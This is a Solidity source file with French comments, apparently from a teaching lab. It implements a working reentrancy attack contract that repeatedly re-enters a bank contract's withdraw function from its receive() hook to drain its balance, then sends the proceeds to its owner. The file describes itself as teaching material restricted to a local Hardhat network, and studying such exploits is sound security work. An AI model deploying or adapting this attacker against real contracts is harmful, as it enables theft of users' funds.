// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @dev Interface minimale commune a BanqueVulnerable et BanqueSecurisee :
///      le meme contrat d'attaque peut ainsi etre lance contre les deux versions.
interface IBanque {
    function deposer() external payable;
    function retirer() external;
}

/// @title Contrat d'attaque par reentrance - usage pedagogique uniquement
/// @notice A utiliser exclusivement sur le reseau local Hardhat, contre les
///         contrats de ce laboratoire.
contract AttaquantReentrance {
    IBanque public immutable banque;      // banque ciblee
    address public immutable proprietaire; // compte qui pilote l'attaque
    uint256 public mise;                   // montant depose pour amorcer l'attaque
    uint256 public nombreReentrees;        // compteur pedagogique de rappels

    constructor(address adresseBanque) {
        banque = IBanque(adresseBanque);
        proprietaire = msg.sender;
    }

    /// @notice Lance l'attaque : depot legitime, puis retrait qui declenche la boucle.
    function attaquer() external payable {
        require(msg.sender == proprietaire, "Pas le proprietaire");
        require(msg.value > 0, "Mise nulle");
        mise = msg.value;

        // Etape 1 : devenir un client "normal" de la banque.
        banque.deposer{value: mise}();

        // Etape 2 : demander le retrait. La banque nous envoie `mise` wei,
        // ce qui execute receive() ci-dessous... avant que notre solde soit remis a zero.
        banque.retirer();
    }

    /// @dev Appelee automatiquement a chaque reception d'ethers.
    ///      Tant que la banque a encore de quoi payer, on rappelle retirer() :
    ///      c'est la reentrance. Chaque rappel nous verse `mise` wei de plus.
    receive() external payable {
        if (address(banque).balance >= mise) {
            nombreReentrees++;
            banque.retirer();
        }
    }

    /// @notice Transfere le butin au compte qui pilote l'attaque.
    function recupererButin() external {
        require(msg.sender == proprietaire, "Pas le proprietaire");
        (bool ok, ) = proprietaire.call{value: address(this).balance}("");
        require(ok, "Echec envoi");
    }
}
